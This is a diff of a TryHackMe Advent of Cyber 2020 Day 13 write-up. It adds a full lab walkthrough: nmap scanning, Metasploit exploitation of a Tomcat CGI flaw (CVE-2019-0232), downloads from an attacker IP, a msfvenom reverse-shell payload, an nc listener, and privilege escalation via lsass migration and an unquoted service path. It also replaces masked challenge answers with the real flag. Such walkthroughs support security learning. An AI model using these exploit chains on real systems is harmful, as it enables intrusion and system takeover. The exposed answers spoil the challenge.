 We could, perhaps, parse our own commands through to this script that will be executed. Because we know that this is a Ubuntu machine,  we can try some Linux commands like ls to list the contents of the working directory:
-
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-13/img4.png)
 
 Or on a Windows machine, the systeminfo command reveals some useful information:
-This is achieved by parsing the command as an argument with ?& i.e. ?&ls . As this is a web server, any spaces or special characters will need to be URL encoded .
-12.7. There are tools for this! Practical Metasploit
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-13/img5.png)
 
-Now we understand the application that's running, tools such as Metasploit can be used to confirm suspicions and hopefully leverage them! After some independent research, this application is vulnerable to the ShellShock attack ( CVE 2014-6271 )
-Let's start Metasploit's console and use the ShellShock payload. (TryHackMe's room and blog post on Metasploit will be useful here)
+This is achieved by parsing the command as an argument with ?& i.e. ?&ls. As this is a web server, any spaces or special characters will need to be [URL encoded](https://www.techopedia.com/definition/10346/url-encoding).
+
+##### 12.7. There are tools for this! Practical Metasploit
+
+Now we understand the application that's running, tools such as Metasploit can be used to confirm suspicions and hopefully leverage them! After some independent research, this application is vulnerable to the [ShellShock attack](https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/) ([CVE 2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271))
+
+Let's start Metasploit's console and use the ShellShock payload. (TryHackMe's [room](https://tryhackme.com/room/rpmetasploit) and [blog](https://blog.tryhackme.com/metasploit/) post on Metasploit will be useful here)
+
 At the minimum, when using an exploit, Metasploit needs to know two things:
-Your machine (such as the TryHackMe AttackBox) that you're attacking from ( LHOST )
-The target that you're attacking ( RHOST(S) )
+* Your machine (such as the TryHackMe AttackBox) that you're attacking from (LHOST)
+* The target that you're attacking (RHOST(S))
+
 Exploits will have their own individual settings that you will need to configure. We can list these by using the options command, then using set OPTION VALUE accordingly. In our example, the exploit involves CGI scripts and as such, we must specify the location of the script on the webserver that we're attacking. In the example so far, this was at http://10.0.0.1/cgi-bin/systeminfo.sh
+
 In order for the attack used as the example in this task to work, the options would be set like so:
-LHOST - 10.0.0.10 (our PC)
-RHOST - 10.0.0.1 (the remote PC)
-TARGETURI /cgi-bin/systeminfo.sh (the location of the script)
+* LHOST - 10.0.0.10 (our PC)
+* RHOST - 10.0.0.1 (the remote PC)
+* TARGETURI /cgi-bin/systeminfo.sh (the location of the script)
 
 Please note that these options are for the exploit used as an example, you will have to set these values accordingly for the challenge.
+
 After ensuring our options are set right, Let's run the exploit to get a Meterpreter connection...Success!
-To run system commands on the host, we will use shell . By creating a shell on the remote host, we can run system commands as if it were our own PC.
-I highly recommend the RP: Metasploit room if you wish to delve into this wonderful framework further.
-12.8. It's Challenge Time
+
+To run system commands on the host, we will use shell. By creating a shell on the remote host, we can run system commands as if it were our own PC.
+
+I highly recommend the [RP: Metasploit](https://tryhackme.com/room/rpmetasploit) room if you wish to delve into this wonderful framework further.
+
+##### 12.8. It's Challenge Time
 
 To solve Elf McSkidy's problem with the elves slacking in the workshop, he has created the CGI script: elfwhacker.bat
-Deploy the instance attached to this task , u se your NMAP skills from " Day 8 - What's Under the Christmas Tree? to find out what port the webserver 10.10.170.60 is running on...Visit the application and discover the installation version, weaponise this information by searching knowledgebases for exploits and Meterpreter payloads possible and whack those elves!.
 
-
+Deploy the instance attached to this task, use your NMAP skills from Day 8 - What's Under the Christmas Tree? to find out what port the webserver 10.10.170.60 is running on...Visit the application and discover the installation version, weaponise this information by searching knowledgebases for exploits and Meterpreter payloads possible and whack those elves!.
 
 As this is a Windows machine, please allow a minimum of five minutes for it to deploy before beginning your enumeration.
 
+**Bonus: There are at least two ways of escalating your privileges after you gain entry. Find these out and pivot at your leisure! (please note that this is optional for the day should you fancy the challenge...)**
 
-Bonus: There are at least two ways of escalating your privileges after you gain entry. Find these out and pivot at your leisure! (please note that this is optional for the day should you fancy the challenge...)
-12.9. Where to go from here
+##### 12.9. Where to go from here
 
+[DarkStar7471's AttackerKB Room](https://tryhackme.com/room/attackerkb)
+[Heavenraiza's MITRE room](https://tryhackme.com/room/mitre)
+[DarkStar7471's RP:Metasploit Room](https://tryhackme.com/room/rpmetasploit)
 
-DarkStar7471's  AttackerKB Room
-Heavenraiza's MITRE room
-DarkStar7471's RP:Metasploit Room
+##### Run Nmap
+```bash
+sudo nmap -Pn -sSVC -v 10.10.61.196
+
+5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Service Unavailable
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open  http          Apache Tomcat 9.0.17
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Apache Tomcat/9.0.17
+|_http-favicon: Apache Tomcat
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+##### Search exploit-db
+```bash
+Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)
+https://www.exploit-db.com/exploits/49039
+
+Apache Tomcat - AJP 'Ghostcat File Read/Inclusion
+https://www.exploit-db.com/exploits/48143
+
+*** Apache Tomcat - CGIServlet enableCmdLineArguments Remote Code Execution (Metasploit)
+https://www.exploit-db.com/exploits/47073
+```
+
+##### Run metasploit
+```bash
+msfconsole -q
+search 2019-0232
+use 0
+set LHOST tun0
+set RHOSTS 10.10.61.196
+set TARGETURI /cgi-bin/elfwhacker.bat
+run
+
+shell
+
+whoami
+tbfc-web-01\elfmcskidy
+
+dir
+19/11/2020  22:06                27 flag1.txt
+type flag1.txt
+thm{whacking_all_the_elves}
+```
+
+##### Enumerate
+```bash
+systeminfo | findstr /b /c:"OS Name" /c:"OS Version"
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+
+powershell -c wget "http://10.13.25.242/PowerUp.ps1" -outfile "PowerUp.ps1"
+PowerShell.exe Invoke-Command -ScriptBlock { "Import-Module .\PowerUp.ps1; Invoke-AllChecks"} 
+
+User Has Local Admin Privileges          
+User In Local Group with Admin Privileges
+Process Token Privileges
+Unquoted Service Paths
+Modifiable Service Files 
+```
+
+##### PrivEsc - Migrate to another process with escalated privileges
+```bash
+Ctrl+Z
+ps
+792   704   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+migrate 792
+whoami
+nt authority\system
+# Success
+```
+
+##### PrivEsc - Unquoted service path
+```bash
+# Find unquoted services.
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\" |findstr /i /v """
+Elfwhacker                                                                          Elfwhacker                                C:\Program Files\TBFC APPS\Elf Whacker\Elfwhacker.exe  
+
+# Check found service.
+wmic service where name="Elfwhacker" get name,displayname,pathname,startmode,state
+DisplayName  Name        PathName                                               StartMode  State    
+Elfwhacker   Elfwhacker  C:\Program Files\TBFC APPS\Elf Whacker\Elfwhacker.exe  Auto       Running 
+
+# Also check found service.
+sc qc Elfwhacker
+SERVICE_NAME: Elfwhacker
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\TBFC APPS\Elf Whacker\Elfwhacker.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Elfwhacker
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+# Download accesschk64.exe to target c:\temp
+powershell -c wget "http://10.13.25.242/accesschk.exe" -outfile "c:\temp\accesschk.exe"
+# Check write permissions on folders in binary path.
+c:\temp\accesschk.exe /accepteula -uwdq "C:\Program Files\TBFC APPS\Elf Whacker\"
+# Can overwrite Elfwhacker.exe
+  RW APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES
+  RW BUILTIN\Administrators
+  RW TBFC-WEB-01\elfmcskidy
+  RW BUILTIN\Users
+  RW NT SERVICE\TrustedInstaller
+  RW NT AUTHORITY\SYSTEM
+
+c:\temp\accesschk.exe /accepteula -uwdq "C:\Program Files\TBFC APPS\"
+# Can write to parent directory
+  RW BUILTIN\Users
+  RW TBFC-WEB-01\elfmcskidy
+  RW NT SERVICE\TrustedInstaller
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+
+# Generate reverse shell payload, to impersonate service.
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.25.242 LPORT=4444 -f exe > Elfwhacker.exe
+# Download to target
+cd "C:\Program Files\TBFC APPS\"
+# Note the file is named for the first part of the unqouted child directory, up to the first space.
+powershell -c wget "http://10.13.25.242/Elfwhacker.exe" -outfile "Elf.exe"
+# Start listener
+nc -lnvp 4444
+# Stop service
+sc stop Elfwhacker
+# Check status
+sc query ElfWhacker
+STATE              : 1  STOPPED
+# Start service
+sc start Elfwhacker
+
+C:\Windows\system32>whoami
+nt authority\system
+# Success
+```
+
 ```
 What is the version number of the web server?
-> Answer format: *.*.**
+> 9.0.17
 ```
 
 ```
 What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)
-> Answer format: *************
+> CVE-2019-0232
 ```
 
 ```
@@ -1713,7 +1893,7 @@ Set your Metasploit settings appropriately and gain a foothold onto the deployed
 
 ```
 What are the contents of flag1.txt
-> Answer format: ***{**********************}
+> thm{whacking_all_the_elves}
 ```
 
 ```
@@ -3026,3 +3206,25 @@ https://www.pfsense.org/
 https://rules.emergingthreats.net/
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
+
+http://www.dvwa.co.uk/
+
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
+
+https://payatu.com/guide-linux-privilege-escalation
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
+
+https://gtfobins.github.io/
+
+https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+https://www.techopedia.com/definition/10346/url-encoding
+
+https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/
+
+https://nvd.nist.gov/vuln/detail/CVE-2014-6271
+
+https://blog.tryhackme.com/metasploit/
